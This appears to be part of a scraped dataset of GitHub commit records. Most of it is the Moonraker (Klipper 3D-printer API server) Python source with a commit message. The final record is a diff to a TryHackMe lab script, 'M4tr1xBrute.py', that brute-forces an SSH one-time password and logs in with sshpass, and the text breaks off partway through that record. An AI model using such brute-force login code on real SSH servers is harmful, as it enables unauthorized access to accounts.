raise ServerError(msg) return default module=importlib.import_module(\"plugins.\" +plugin_name) try: if plugin_name not in CORE_PLUGINS: config=config[plugin_name] load_func=getattr(module, \"load_plugin\") plugin=load_func(config) except Exception: msg=f\"Unable to load plugin({plugin_name})\" logging.exception(msg) if default==Sentinel: raise ServerError(msg) return default self.plugins[plugin_name]=plugin logging.info(f\"Plugin({plugin_name}) loaded\") return plugin def lookup_plugin(self, plugin_name, default=Sentinel): plugin=self.plugins.get(plugin_name, default) if plugin==Sentinel: raise ServerError(f\"Plugin({plugin_name}) not found\") return plugin def register_event_handler(self, event, callback): self.events.setdefault(event,[]).append(callback) def send_event(self, event, *args): events=self.events.get(event,[]) for evt in events: self.ioloop.spawn_callback(evt, *args) def register_remote_method(self, method_name, cb, need_klippy_reg=True): if method_name in self.remote_methods: logging.info(f\"Remote method({method_name}) already registered\") return self.remote_methods[method_name]=cb if need_klippy_reg: self.klippy_reg_methods.append(method_name) def get_host_info(self): hostname=socket.gethostname() return hostname, self.port async def _connect_klippy(self): if not self.server_running: return ret=await self.klippy_connection.connect(self.klippy_address) if not ret: self.ioloop.call_later(.25, self._connect_klippy) return self.ioloop.spawn_callback(self._initialize) def process_command(self, cmd): method=cmd.get('method', None) if method is not None: cb=self.remote_methods.get(method, None) if cb is not None: params=cmd.get('params',{}) cb(**params) else: logging.info(f\"Unknown method received:{method}\") return req_id=cmd.get('id', None) request=self.pending_requests.pop(req_id, None) if request is None: logging.info( f\"No request matching request ID:{req_id}, \" f\"response:{cmd}\") return if 'result' in cmd: result=cmd['result'] if not result: result=\"ok\" else: err=cmd.get('error', \"Malformed Klippy Response\") result=ServerError(err, 400) request.notify(result) def on_connection_closed(self): self.init_list=[] self.klippy_state=\"disconnected\" for request in self.pending_requests.values(): request.notify(ServerError(\"Klippy Disconnected\", 503)) self.pending_requests={} logging.info(\"Klippy Connection Removed\") self.send_event(\"server:klippy_disconnect\") if self.init_handle is not None: self.ioloop.remove_timeout(self.init_handle) if self.server_running: self.ioloop.call_later(.25, self._connect_klippy) async def _initialize(self): if not self.server_running: return await self._check_ready() await self._request_endpoints() if \"webhooks_sub\" not in self.init_list: temp_subs=self.all_subscriptions self.all_subscriptions={} try: await self.klippy_apis.subscribe_objects({'webhooks': None}) except ServerError as e: logging.info(f\"{e}\\nUnable to subscribe to webhooks object\") else: logging.info(\"Webhooks Subscribed\") self.init_list.append(\"webhooks_sub\") self.all_subscriptions.update(temp_subs) if \"gcode_output_sub\" not in self.init_list: try: await self.klippy_apis.subscribe_gcode_output() except ServerError as e: logging.info( f\"{e}\\nUnable to register gcode output subscription\") else: logging.info(\"GCode Output Subscribed\") self.init_list.append(\"gcode_output_sub\") if \"klippy_ready\" in self.init_list or \\ not self.klippy_connection.is_connected(): self.init_attempts=0 self.init_handle=None else: self.init_attempts +=1 self.init_handle=self.ioloop.call_later( INIT_TIME, self._initialize) async def _request_endpoints(self): result=await self.klippy_apis.list_endpoints(default=None) if result is None: return endpoints=result.get('endpoints',{}) for ep in endpoints: self.moonraker_app.register_remote_handler(ep) async def _check_ready(self): send_id=\"identified\" not in self.init_list try: result=await self.klippy_apis.get_klippy_info(send_id) except ServerError as e: if self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: logging.info( f\"{e}\\nKlippy info request error. This indicates that\\n\" f\"Klippy may have experienced an error during startup.\\n\" f\"Please check klippy.log for more information\") return if send_id: self.init_list.append(\"identified\") fixed_paths={k: result[k] for k in ['klipper_path', 'python_path', 'log_file', 'config_file']} file_manager=self.lookup_plugin('file_manager') file_manager.update_fixed_paths(fixed_paths) self.klippy_state=result.get('state', \"unknown\") if self.klippy_state==\"ready\": await self._verify_klippy_requirements() logging.info(\"Klippy ready\") self.init_list.append('klippy_ready') for method in self.klippy_reg_methods: try: await self.klippy_apis.register_method(method) except ServerError: logging.exception(f\"Unable to register method '{method}'\") self.send_event(\"server:klippy_ready\") elif self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: msg=result.get('state_message', \"Klippy Not Ready\") logging.info(\"\\n\" +msg) async def _verify_klippy_requirements(self): result=await self.klippy_apis.get_object_list(default=None) if result is None: logging.info( f\"Unable to retreive Klipper Object List\") return for name in list(self.all_subscriptions.keys()): if name not in result: del self.all_subscriptions[name] req_objs=set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"]) missing_objs=req_objs -set(result) if missing_objs: err_str=\", \".join([f\"[{o}]\" for o in missing_objs]) logging.info( f\"\\nWarning, unable to detect the following printer \" f\"objects:\\n{err_str}\\nPlease add the the above sections \" f\"to printer.cfg for full Moonraker functionality.\") if \"virtual_sdcard\" not in missing_objs: result=await self.klippy_apis.query_objects( {'configfile': None}, default=None) if result is None: logging.info(f\"Unable to set SD Card path\") else: config=result.get('configfile',{}).get('config',{}) vsd_config=config.get('virtual_sdcard',{}) vsd_path=vsd_config.get('path', None) if vsd_path is not None: file_manager=self.lookup_plugin('file_manager') file_manager.register_directory('gcodes', vsd_path) else: logging.info( \"Configuration for[virtual_sdcard] not found,\" \" unable to set SD Card path\") def _process_gcode_response(self, response): self.send_event(\"server:gcode_response\", response) def _process_status_update(self, eventtime, status): if 'webhooks' in status: state=status['webhooks'].get('state', None) if state is not None: if state==\"shutdown\": logging.info(\"Klippy has shutdown\") self.send_event(\"server:klippy_shutdown\") self.klippy_state=state self.send_event(\"server:status_update\", status) async def make_request(self, rpc_method, params): if rpc_method==\"objects\/subscribe\": for obj, items in params.get('objects',{}).items(): if obj in self.all_subscriptions: pi=self.all_subscriptions[obj] if items is None or pi is None: self.all_subscriptions[obj]=None else: uitems=list(set(pi) | set(items)) self.all_subscriptions[obj]=uitems else: self.all_subscriptions[obj]=items params['objects']=dict(self.all_subscriptions) params['response_template']={'method': \"process_status_update\"} base_request=BaseRequest(rpc_method, params) self.pending_requests[base_request.id]=base_request self.ioloop.spawn_callback( self.klippy_connection.send_request, base_request) result=await base_request.wait() return result async def _stop_server(self): self.server_running=False for name, plugin in self.plugins.items(): if hasattr(plugin, \"close\"): ret=plugin.close() if asyncio.iscoroutine(ret): await ret self.klippy_connection.close() while self.klippy_state !=\"disconnected\": await gen.sleep(.1) await self.moonraker_app.close() self.ioloop.stop() async def _handle_server_restart(self, path, method, args): self.ioloop.spawn_callback(self._stop_server) return \"ok\" async def _handle_info_request(self, path, method, args): return{ 'klippy_connected': self.klippy_connection.is_connected(), 'klippy_state': self.klippy_state, 'plugins': list(self.plugins.keys())} class KlippyConnection: def __init__(self, on_recd, on_close): self.ioloop=IOLoop.current() self.iostream=None self.on_recd=on_recd self.on_close=on_close async def connect(self, address): ksock=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) kstream=iostream.IOStream(ksock) try: await kstream.connect(address) except iostream.StreamClosedError: return False logging.info(\"Klippy Connection Established\") self.iostream=kstream self.iostream.set_close_callback(self.on_close) self.ioloop.spawn_callback(self._read_stream, self.iostream) return True async def _read_stream(self, stream): while not stream.closed(): try: data=await stream.read_until(b'\\x03') except iostream.StreamClosedError as e: return except Exception: logging.exception(\"Klippy Stream Read Error\") continue try: decoded_cmd=json.loads(data[:-1]) self.on_recd(decoded_cmd) except Exception: logging.exception( f\"Error processing Klippy Host Response:{data.decode()}\") async def send_request(self, request): if self.iostream is None: request.notify(ServerError(\"Klippy Host not connected\", 503)) return data=json.dumps(request.to_dict()).encode() +b\"\\x03\" try: await self.iostream.write(data) except iostream.StreamClosedError: request.notify(ServerError(\"Klippy Host not connected\", 503)) def is_connected(self): return self.iostream is not None and not self.iostream.closed() def close(self): if self.iostream is not None and \\ not self.iostream.closed(): self.iostream.close() class BaseRequest: def __init__(self, rpc_method, params): self.id=id(self) self.rpc_method=rpc_method self.params=params self._event=Event() self.response=None async def wait(self): start_time=time.time() while True: timeout=time.time() +60. try: await self._event.wait(timeout=timeout) except TimeoutError: pending_time=time.time() -start_time logging.info( f\"Request '{self.rpc_method}' pending: \" f\"{pending_time:.2f} seconds\") self._event.clear() continue break if isinstance(self.response, ServerError): raise self.response return self.response def notify(self, response): self.response=response self._event.set() def to_dict(self): return{'id': self.id, 'method': self.rpc_method, 'params': self.params} def main(): parser=argparse.ArgumentParser( description=\"Moonraker -Klipper API Server\") parser.add_argument( \"-c\", \"--configfile\", default=\"~\/moonraker.conf\", metavar='<configfile>', help=\"Location of moonraker configuration file\") parser.add_argument( \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>', help=\"log file name and location\") cmd_line_args=parser.parse_args() log_file=os.path.normpath(os.path.expanduser(cmd_line_args.logfile)) cmd_line_args.logfile=log_file ql=utils.setup_logging(log_file) if sys.version_info <(3, 7): msg=f\"Moonraker requires Python 3.7 or above. \" \\ f\"Detected Version:{sys.version}\" logging.info(msg) print(msg) ql.stop() exit(1) io_loop=IOLoop.current() estatus=0 while True: try: server=Server(cmd_line_args) except Exception: logging.exception(\"Moonraker Error\") estatus=1 break try: server.start() io_loop.start() except Exception: logging.exception(\"Server Running Error\") estatus=1 break time.sleep(.5) logging.info(\"Attempting Server Restart...\") io_loop.close(True) logging.info(\"Server Shutdown\") ql.stop() exit(estatus) if __name__=='__main__': main() ","sourceWithComments":"# Moonraker - HTTP\/Websocket API Server for Klipper\n#\n# Copyright (C) 2020 Eric Callahan <arksine.code@gmail.com>\n#\n# This file may be distributed under the terms of the GNU GPLv3 license\nimport argparse\nimport sys\nimport importlib\nimport os\nimport time\nimport socket\nimport logging\nimport json\nimport confighelper\nimport utils\nimport asyncio\nfrom tornado import iostream, gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.util import TimeoutError\nfrom tornado.locks import Event\nfrom app import MoonrakerApp\nfrom utils import ServerError\n\nINIT_TIME = .25\nLOG_ATTEMPT_INTERVAL = int(2. \/ INIT_TIME + .5)\nMAX_LOG_ATTEMPTS = 10 * LOG_ATTEMPT_INTERVAL\n\nCORE_PLUGINS = [\n    'file_manager', 'klippy_apis', 'machine',\n    'data_store', 'shell_command']\n\nclass Sentinel:\n    pass\n\nclass Server:\n    error = ServerError\n    def __init__(self, args):\n        config = confighelper.get_configuration(self, args)\n        self.host = config.get('host', \"0.0.0.0\")\n        self.port = config.getint('port', 7125)\n\n        # Event initialization\n        self.events = {}\n\n        # Klippy Connection Handling\n        self.klippy_address = config.get(\n            'klippy_uds_address', \"\/tmp\/klippy_uds\")\n        self.klippy_connection = KlippyConnection(\n            self.process_command, self.on_connection_closed)\n        self.init_list = []\n        self.init_handle = None\n        self.init_attempts = 0\n        self.klippy_state = \"disconnected\"\n\n        # XXX - currently moonraker maintains a superset of all\n        # subscriptions, the results of which are forwarded to all\n        # connected websockets. A better implementation would open a\n        # unique unix domain socket for each websocket client and\n        # allow Klipper to forward only those subscriptions back to\n        # correct client.\n        self.all_subscriptions = {}\n\n        # Server\/IOLoop\n        self.server_running = False\n        self.moonraker_app = app = MoonrakerApp(config)\n        self.register_endpoint = app.register_local_handler\n        self.register_static_file_handler = app.register_static_file_handler\n        self.register_upload_handler = app.register_upload_handler\n        self.ioloop = IOLoop.current()\n\n        self.register_endpoint(\n            \"\/server\/info\", ['GET'], self._handle_info_request)\n        self.register_endpoint(\n            \"\/server\/restart\", ['POST'], self._handle_server_restart)\n\n        # Setup remote methods accessable to Klippy.  Note that all\n        # registered remote methods should be of the notification type,\n        # they do not return a response to Klippy after execution\n        self.pending_requests = {}\n        self.remote_methods = {}\n        self.klippy_reg_methods = []\n        self.register_remote_method(\n            'process_gcode_response', self._process_gcode_response,\n            need_klippy_reg=False)\n        self.register_remote_method(\n            'process_status_update', self._process_status_update,\n            need_klippy_reg=False)\n\n        # Plugin initialization\n        self.plugins = {}\n        self.klippy_apis = self.load_plugin(config, 'klippy_apis')\n        self._load_plugins(config)\n\n    def start(self):\n        hostname, hostport = self.get_host_info()\n        logging.info(\n            f\"Starting Moonraker on ({self.host}, {hostport}), \"\n            f\"Hostname: {hostname}\")\n        self.moonraker_app.listen(self.host, self.port)\n        self.server_running = True\n        self.ioloop.spawn_callback(self._connect_klippy)\n\n    # ***** Plugin Management *****\n    def _load_plugins(self, config):\n        # load core plugins\n        for plugin in CORE_PLUGINS:\n            self.load_plugin(config, plugin)\n\n        # check for optional plugins\n        opt_sections = set(config.sections()) - \\\n            set(['server', 'authorization', 'cmd_args'])\n        for section in opt_sections:\n            self.load_plugin(config, section, None)\n\n    def load_plugin(self, config, plugin_name, default=Sentinel):\n        if plugin_name in self.plugins:\n            return self.plugins[plugin_name]\n        # Make sure plugin exists\n        mod_path = os.path.join(\n            os.path.dirname(__file__), 'plugins', plugin_name + '.py')\n        if not os.path.exists(mod_path):\n            msg = f\"Plugin ({plugin_name}) does not exist\"\n            logging.info(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        module = importlib.import_module(\"plugins.\" + plugin_name)\n        try:\n            if plugin_name not in CORE_PLUGINS:\n                config = config[plugin_name]\n            load_func = getattr(module, \"load_plugin\")\n            plugin = load_func(config)\n        except Exception:\n            msg = f\"Unable to load plugin ({plugin_name})\"\n            logging.exception(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        self.plugins[plugin_name] = plugin\n        logging.info(f\"Plugin ({plugin_name}) loaded\")\n        return plugin\n\n    def lookup_plugin(self, plugin_name, default=Sentinel):\n        plugin = self.plugins.get(plugin_name, default)\n        if plugin == Sentinel:\n            raise ServerError(f\"Plugin ({plugin_name}) not found\")\n        return plugin\n\n    def register_event_handler(self, event, callback):\n        self.events.setdefault(event, []).append(callback)\n\n    def send_event(self, event, *args):\n        events = self.events.get(event, [])\n        for evt in events:\n            self.ioloop.spawn_callback(evt, *args)\n\n    def register_remote_method(self, method_name, cb, need_klippy_reg=True):\n        if method_name in self.remote_methods:\n            # XXX - may want to raise an exception here\n            logging.info(f\"Remote method ({method_name}) already registered\")\n            return\n        self.remote_methods[method_name] = cb\n        if need_klippy_reg:\n            # These methods need to be registered with Klippy\n            self.klippy_reg_methods.append(method_name)\n\n    def get_host_info(self):\n        hostname = socket.gethostname()\n        return hostname, self.port\n\n    # ***** Klippy Connection *****\n    async def _connect_klippy(self):\n        if not self.server_running:\n            return\n        ret = await self.klippy_connection.connect(self.klippy_address)\n        if not ret:\n            self.ioloop.call_later(.25, self._connect_klippy)\n            return\n        # begin server iniialization\n        self.ioloop.spawn_callback(self._initialize)\n\n    def process_command(self, cmd):\n        method = cmd.get('method', None)\n        if method is not None:\n            # This is a remote method called from klippy\n            cb = self.remote_methods.get(method, None)\n            if cb is not None:\n                params = cmd.get('params', {})\n                cb(**params)\n            else:\n                logging.info(f\"Unknown method received: {method}\")\n            return\n        # This is a response to a request, process\n        req_id = cmd.get('id', None)\n        request = self.pending_requests.pop(req_id, None)\n        if request is None:\n            logging.info(\n                f\"No request matching request ID: {req_id}, \"\n                f\"response: {cmd}\")\n            return\n        if 'result' in cmd:\n            result = cmd['result']\n            if not result:\n                result = \"ok\"\n        else:\n            err = cmd.get('error', \"Malformed Klippy Response\")\n            result = ServerError(err, 400)\n        request.notify(result)\n\n    def on_connection_closed(self):\n        self.init_list = []\n        self.klippy_state = \"disconnected\"\n        for request in self.pending_requests.values():\n            request.notify(ServerError(\"Klippy Disconnected\", 503))\n        self.pending_requests = {}\n        logging.info(\"Klippy Connection Removed\")\n        self.send_event(\"server:klippy_disconnect\")\n        if self.init_handle is not None:\n            self.ioloop.remove_timeout(self.init_handle)\n        if self.server_running:\n            self.ioloop.call_later(.25, self._connect_klippy)\n\n    async def _initialize(self):\n        if not self.server_running:\n            return\n        await self._check_ready()\n        await self._request_endpoints()\n        # Subscribe to \"webhooks\"\n        # Register \"webhooks\" subscription\n        if \"webhooks_sub\" not in self.init_list:\n            temp_subs = self.all_subscriptions\n            self.all_subscriptions = {}\n            try:\n                await self.klippy_apis.subscribe_objects({'webhooks': None})\n            except ServerError as e:\n                logging.info(f\"{e}\\nUnable to subscribe to webhooks object\")\n            else:\n                logging.info(\"Webhooks Subscribed\")\n                self.init_list.append(\"webhooks_sub\")\n            self.all_subscriptions.update(temp_subs)\n        # Subscribe to Gcode Output\n        if \"gcode_output_sub\" not in self.init_list:\n            try:\n                await self.klippy_apis.subscribe_gcode_output()\n            except ServerError as e:\n                logging.info(\n                    f\"{e}\\nUnable to register gcode output subscription\")\n            else:\n                logging.info(\"GCode Output Subscribed\")\n                self.init_list.append(\"gcode_output_sub\")\n        if \"klippy_ready\" in self.init_list or \\\n                not self.klippy_connection.is_connected():\n            # Either Klippy is ready or the connection dropped\n            # during initialization.  Exit initialization\n            self.init_attempts = 0\n            self.init_handle = None\n        else:\n            self.init_attempts += 1\n            self.init_handle = self.ioloop.call_later(\n                INIT_TIME, self._initialize)\n\n    async def _request_endpoints(self):\n        result = await self.klippy_apis.list_endpoints(default=None)\n        if result is None:\n            return\n        endpoints = result.get('endpoints', {})\n        for ep in endpoints:\n            self.moonraker_app.register_remote_handler(ep)\n\n    async def _check_ready(self):\n        send_id = \"identified\" not in self.init_list\n        try:\n            result = await self.klippy_apis.get_klippy_info(send_id)\n        except ServerError as e:\n            if self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                    self.init_attempts <= MAX_LOG_ATTEMPTS:\n                logging.info(\n                    f\"{e}\\nKlippy info request error.  This indicates that\\n\"\n                    f\"Klippy may have experienced an error during startup.\\n\"\n                    f\"Please check klippy.log for more information\")\n            return\n        if send_id:\n            self.init_list.append(\"identified\")\n        # Update filemanager fixed paths\n        fixed_paths = {k: result[k] for k in\n                       ['klipper_path', 'python_path',\n                        'log_file', 'config_file']}\n        file_manager = self.lookup_plugin('file_manager')\n        file_manager.update_fixed_paths(fixed_paths)\n        self.klippy_state = result.get('state', \"unknown\")\n        if self.klippy_state == \"ready\":\n            await self._verify_klippy_requirements()\n            logging.info(\"Klippy ready\")\n            self.init_list.append('klippy_ready')\n            # register methods with klippy\n            for method in self.klippy_reg_methods:\n                try:\n                    await self.klippy_apis.register_method(method)\n                except ServerError:\n                    logging.exception(f\"Unable to register method '{method}'\")\n            self.send_event(\"server:klippy_ready\")\n        elif self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                self.init_attempts <= MAX_LOG_ATTEMPTS:\n            msg = result.get('state_message', \"Klippy Not Ready\")\n            logging.info(\"\\n\" + msg)\n\n    async def _verify_klippy_requirements(self):\n        result = await self.klippy_apis.get_object_list(default=None)\n        if result is None:\n            logging.info(\n                f\"Unable to retreive Klipper Object List\")\n            return\n        # Remove stale objects from the persistent subscription dict\n        for name in list(self.all_subscriptions.keys()):\n            if name not in result:\n                del self.all_subscriptions[name]\n        req_objs = set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"])\n        missing_objs = req_objs - set(result)\n        if missing_objs:\n            err_str = \", \".join([f\"[{o}]\" for o in missing_objs])\n            logging.info(\n                f\"\\nWarning, unable to detect the following printer \"\n                f\"objects:\\n{err_str}\\nPlease add the the above sections \"\n                f\"to printer.cfg for full Moonraker functionality.\")\n        if \"virtual_sdcard\" not in missing_objs:\n            # Update the gcode path\n            result = await self.klippy_apis.query_objects(\n                {'configfile': None}, default=None)\n            if result is None:\n                logging.info(f\"Unable to set SD Card path\")\n            else:\n                config = result.get('configfile', {}).get('config', {})\n                vsd_config = config.get('virtual_sdcard', {})\n                vsd_path = vsd_config.get('path', None)\n                if vsd_path is not None:\n                    file_manager = self.lookup_plugin('file_manager')\n                    file_manager.register_directory('gcodes', vsd_path)\n                else:\n                    logging.info(\n                        \"Configuration for [virtual_sdcard] not found,\"\n                        \" unable to set SD Card path\")\n\n    def _process_gcode_response(self, response):\n        self.send_event(\"server:gcode_response\", response)\n\n    def _process_status_update(self, eventtime, status):\n        if 'webhooks' in status:\n            # XXX - process other states (startup, ready, error, etc)?\n            state = status['webhooks'].get('state', None)\n            if state is not None:\n                if state == \"shutdown\":\n                    logging.info(\"Klippy has shutdown\")\n                    self.send_event(\"server:klippy_shutdown\")\n                self.klippy_state = state\n        self.send_event(\"server:status_update\", status)\n\n    async def make_request(self, rpc_method, params):\n        # XXX - This adds the \"response_template\" to a subscription\n        # request and tracks all subscriptions so that each\n        # client gets what its requesting.  In the future we should\n        # track subscriptions per client and send clients only\n        # the data they are asking for.\n        if rpc_method == \"objects\/subscribe\":\n            for obj, items in params.get('objects', {}).items():\n                if obj in self.all_subscriptions:\n                    pi = self.all_subscriptions[obj]\n                    if items is None or pi is None:\n                        self.all_subscriptions[obj] = None\n                    else:\n                        uitems = list(set(pi) | set(items))\n                        self.all_subscriptions[obj] = uitems\n                else:\n                    self.all_subscriptions[obj] = items\n            params['objects'] = dict(self.all_subscriptions)\n            params['response_template'] = {'method': \"process_status_update\"}\n\n        base_request = BaseRequest(rpc_method, params)\n        self.pending_requests[base_request.id] = base_request\n        self.ioloop.spawn_callback(\n            self.klippy_connection.send_request, base_request)\n        result = await base_request.wait()\n        return result\n\n    async def _stop_server(self):\n        self.server_running = False\n        for name, plugin in self.plugins.items():\n            if hasattr(plugin, \"close\"):\n                ret = plugin.close()\n                if asyncio.iscoroutine(ret):\n                    await ret\n        self.klippy_connection.close()\n        while self.klippy_state != \"disconnected\":\n            await gen.sleep(.1)\n        await self.moonraker_app.close()\n        self.ioloop.stop()\n\n    async def _handle_server_restart(self, path, method, args):\n        self.ioloop.spawn_callback(self._stop_server)\n        return \"ok\"\n\n    async def _handle_info_request(self, path, method, args):\n        return {\n            'klippy_connected': self.klippy_connection.is_connected(),\n            'klippy_state': self.klippy_state,\n            'plugins': list(self.plugins.keys())}\n\nclass KlippyConnection:\n    def __init__(self, on_recd, on_close):\n        self.ioloop = IOLoop.current()\n        self.iostream = None\n        self.on_recd = on_recd\n        self.on_close = on_close\n\n    async def connect(self, address):\n        ksock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        kstream = iostream.IOStream(ksock)\n        try:\n            await kstream.connect(address)\n        except iostream.StreamClosedError:\n            return False\n        logging.info(\"Klippy Connection Established\")\n        self.iostream = kstream\n        self.iostream.set_close_callback(self.on_close)\n        self.ioloop.spawn_callback(self._read_stream, self.iostream)\n        return True\n\n    async def _read_stream(self, stream):\n        while not stream.closed():\n            try:\n                data = await stream.read_until(b'\\x03')\n            except iostream.StreamClosedError as e:\n                return\n            except Exception:\n                logging.exception(\"Klippy Stream Read Error\")\n                continue\n            try:\n                decoded_cmd = json.loads(data[:-1])\n                self.on_recd(decoded_cmd)\n            except Exception:\n                logging.exception(\n                    f\"Error processing Klippy Host Response: {data.decode()}\")\n\n    async def send_request(self, request):\n        if self.iostream is None:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n            return\n        data = json.dumps(request.to_dict()).encode() + b\"\\x03\"\n        try:\n            await self.iostream.write(data)\n        except iostream.StreamClosedError:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n\n    def is_connected(self):\n        return self.iostream is not None and not self.iostream.closed()\n\n    def close(self):\n        if self.iostream is not None and \\\n                not self.iostream.closed():\n            self.iostream.close()\n\n# Basic WebRequest class, easily converted to dict for json encoding\nclass BaseRequest:\n    def __init__(self, rpc_method, params):\n        self.id = id(self)\n        self.rpc_method = rpc_method\n        self.params = params\n        self._event = Event()\n        self.response = None\n\n    async def wait(self):\n        # Log pending requests every 60 seconds\n        start_time = time.time()\n        while True:\n            timeout = time.time() + 60.\n            try:\n                await self._event.wait(timeout=timeout)\n            except TimeoutError:\n                pending_time = time.time() - start_time\n                logging.info(\n                    f\"Request '{self.rpc_method}' pending: \"\n                    f\"{pending_time:.2f} seconds\")\n                self._event.clear()\n                continue\n            break\n        if isinstance(self.response, ServerError):\n            raise self.response\n        return self.response\n\n    def notify(self, response):\n        self.response = response\n        self._event.set()\n\n    def to_dict(self):\n        return {'id': self.id, 'method': self.rpc_method,\n                'params': self.params}\n\ndef main():\n    # Parse start arguments\n    parser = argparse.ArgumentParser(\n        description=\"Moonraker - Klipper API Server\")\n    parser.add_argument(\n        \"-c\", \"--configfile\", default=\"~\/moonraker.conf\",\n        metavar='<configfile>',\n        help=\"Location of moonraker configuration file\")\n    parser.add_argument(\n        \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>',\n        help=\"log file name and location\")\n    cmd_line_args = parser.parse_args()\n\n    # Setup Logging\n    log_file = os.path.normpath(os.path.expanduser(cmd_line_args.logfile))\n    cmd_line_args.logfile = log_file\n    ql = utils.setup_logging(log_file)\n\n    if sys.version_info < (3, 7):\n        msg = f\"Moonraker requires Python 3.7 or above.  \" \\\n            f\"Detected Version: {sys.version}\"\n        logging.info(msg)\n        print(msg)\n        ql.stop()\n        exit(1)\n\n    # Start IOLoop and Server\n    io_loop = IOLoop.current()\n    estatus = 0\n    while True:\n        try:\n            server = Server(cmd_line_args)\n        except Exception:\n            logging.exception(\"Moonraker Error\")\n            estatus = 1\n            break\n        try:\n            server.start()\n            io_loop.start()\n        except Exception:\n            logging.exception(\"Server Running Error\")\n            estatus = 1\n            break\n        # Since we are running outside of the the server\n        # it is ok to use a blocking sleep here\n        time.sleep(.5)\n        logging.info(\"Attempting Server Restart...\")\n    io_loop.close(True)\n    logging.info(\"Server Shutdown\")\n    ql.stop()\n    exit(estatus)\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>"}},"https:\/\/github.com\/kspohn903\/THM_M4tr1xBrute_Complete":{"e52647b46ad50b345b1f2aaee1673b041fcca9e8":{"url":"https:\/\/api.github.com\/repos\/kspohn903\/THM_M4tr1xBrute_Complete\/commits\/e52647b46ad50b345b1f2aaee1673b041fcca9e8","html_url":"https:\/\/github.com\/kspohn903\/THM_M4tr1xBrute_Complete\/commit\/e52647b46ad50b345b1f2aaee1673b041fcca9e8","message":"Update M4tr1xBrute.py\n\nCommenting out info that doesn't work as remote code brute-force on architect brute-force (\"ssh-totp\"), pythonic code attack...\r\nDefaulting on linux UTC Command initially using subprocess to ensure code execution. Otherwise, debug code and attempted command queries still there as debug code (modded GeardoRanger Code....) \r\nThis may be complete for the last bit, but it IS NOT an officially sanctioned THM Code Write-Up piece due to revealing the SSH-TOTP keys from BlackCat AttackBox Web Server...","sha":"e52647b46ad50b345b1f2aaee1673b041fcca9e8","keyword":"remote code execution attack","diff":"diff --git a\/M4tr1xBrute.py b\/M4tr1xBrute.py\nindex b00bcd9..d204075 100644\n--- a\/M4tr1xBrute.py\n+++ b\/M4tr1xBrute.py\n@@ -61,7 +61,7 @@ def getRandom():\n     uc = ctt ^ random.choice(secretList)\r\n     hc = (sha256(repr(uc).encode('utf-8')).hexdigest())\r\n     t = hc[22:44]\r\n-    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n+    # print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n     return t\r\n \r\n while True:\r\n@@ -76,11 +76,12 @@ def getRandom():\n         # output = subprocess.getoutput(f'gnome-terminal -x bash -c \"sshpass -p {OTP} ssh {USER}@{RHOST}\"')\r\n         # exec(output)\r\n         print(\"Execute this command: sshpass -p \\'{}\\' ssh architect@{}\\n\\n You have 60 seconds or less to run this command.\".format(OTP,RHOST))\r\n-        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n-        processExitCode = sshprocess.poll()\r\n-        print(\"processExitCode = {}\\n\".format(processExitCode))\r\n-        sys.exit()\r\n+        # sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n+        # processExitCode = sshprocess.poll()\r\n+        # print(\"processExitCode = {}\\n\".format(processExitCode))\r\n+        # sys.exit()\r\n+        break\r\n     except Exception as ex:\r\n         print(\"Connection failed with: {}, trying again!\\n\".format(OTP))\r\n         # tb.print_exc()\r\n-        continue\n\\ No newline at end of file\n+        continue\r\n","files":{"\/M4tr1xBrute.py":{"changes":[{"diff":"\n     uc = ctt ^ random.choice(secretList)\r\n     hc = (sha256(repr(uc).encode('utf-8')).hexdigest())\r\n     t = hc[22:44]\r\n-    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n+    # print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r\n     return t\r\n \r\n while True:\r\n","add":1,"remove":1,"filename":"\/M4tr1xBrute.py","badparts":["    print(\"M4tr1xBrute: getRandom: t = {}\\n\".format(t))\r"],"goodparts":[]},{"diff":"\n         # output = subprocess.getoutput(f'gnome-terminal -x bash -c \"sshpass -p {OTP} ssh {USER}@{RHOST}\"')\r\n         # exec(output)\r\n         print(\"Execute this command: sshpass -p \\'{}\\' ssh architect@{}\\n\\n You have 60 seconds or less to run this command.\".format(OTP,RHOST))\r\n-        sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n-        processExitCode = sshprocess.poll()\r\n-        print(\"processExitCode = {}\\n\".format(processExitCode))\r\n-        sys.exit()\r\n+        # sshprocess = subprocess.Popen([\"sshpass\", \"-p\", \"{}\".format(OTP), \"ssh\", \"architect@{}\".format(RHOST)])\r\n+        # processExitCode = sshprocess.poll()\r\n+        # print(\"processExitCode = {}\\n\".format(processExitCode))\r\n+        # sys.exit()\r\n+        break\r\n     except Exception as ex:\r\n         print(\"Connection failed with: {}, trying again!\\n\".format(OTP))\r\n         # tb.print_exc()\r\n-        continue\n\\ No newline at end of file\n+        